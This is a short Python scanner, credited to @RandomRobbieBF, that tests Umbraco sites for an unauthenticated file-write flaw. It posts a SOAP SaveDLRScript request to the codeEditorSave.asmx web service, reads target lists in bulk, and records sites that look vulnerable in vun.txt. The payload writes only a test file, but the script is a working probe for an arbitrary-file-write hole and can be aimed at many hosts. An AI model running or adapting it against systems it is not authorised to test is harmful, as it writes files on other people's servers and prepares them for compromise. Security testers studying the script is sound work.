!/usr/bin/env python
#
# Umbraco Test upload
#
# 
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False,help="URL of host to check will need http or https")
parser.add_argument("-f", "--file", default="urls.txt",required=False, help="File of URLS to check SSRF Against")


args = parser.parse_args()
files = args.file
url = args.url

def test_page(newurl):
	burp0_data = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\t<soap:Body>\r\n\t\t<SaveDLRScript xmlns=\"http://tempuri.org/\">\r\n\t\t\t<fileName>test.txt</fileName>\r\n\t\t\t<oldName>string</oldName>\r\n\t\t\t<fileContents>test</fileContents>\r\n\t\t\t<ignoreDebugging>1</ignoreDebugging>\r\n\t\t</SaveDLRScript>\r\n\t</soap:Body>\r\n</soap:Envelope>"
	headers = {"SOAPAction":"\"http://tempuri.org/SaveDLRScript\"","Connection":"close","Content-Type":"text/xml; charset=utf-8"}
	try:
		response = session.post(""+newurl+"/umbraco/webservices/codeEditorSave.asmx", headers=headers,verify=False,data=burp0_data)
		if response.status_code == 200:
			if "true" in response.text:
				print ("[*] Umbraco Looks to be Vun!")
				text_file = open("vun.txt", "a")
				text_file.write("URL: %s\n" % newurl)
				text_file.close()
			else:
				print ("[-] Sorry Not Vuln [-]")
		else:
			print("[-] Got a None 200 HTTP response Bad URL [-]")
	except Exception as e:
		print ("[-] Error: "+e+" [-]")






if files:
	if os.path.exists(files):
		with open(files, 'r') as f:
			for line in f:
				newurl = line.replace("\n","")
				test_page(newurl)
		f.close()
				
				
if url:
	test_page(url)
